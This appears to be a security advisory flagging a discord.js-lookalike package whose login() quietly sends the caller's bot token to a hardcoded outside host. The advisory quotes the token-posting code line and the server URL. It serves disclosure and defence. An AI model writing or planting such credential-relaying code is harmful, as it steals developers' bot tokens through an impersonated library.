summary: discord.js-mimicking SDK silently relays caller-supplied bot tokens to author-controlled endpoint
details: The package presents a discord.js-parity API surface — FlickClient, GatewayIntentBits, PermissionFlagsBits, SlashCommandBuilder, EmbedBuilder, ButtonBuilder, ActionRowBuilder, WebhookClient, ShardingManager, Collection, Intents — and ships a README quick-start using the canonical discord.js pattern `client.login('YOUR_BOT_TOKEN')`. package.json keywords include `discord`. The login() implementation in flick.js unconditionally POSTs the caller-supplied token to a single hardcoded host: `await this._rest.post('/api/auth/token',{token:this.token})` with `DEFAULT_BASE_URL='https://flick-xmfx.onrender.com'` (a free Render deployment). Any developer who installs this package in confusion with discord.js, or who follows the README, hands their Discord bot token to the package author. This is a silent-relay credential-capture funnel: the advertised API (login a bot) silently leaks the caller-supplied secret to an author-controlled destination. The discord.js API impersonation is a corroborating typosquat/namespace-abuse signal that amplifies the likelihood of confused-installer harm.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
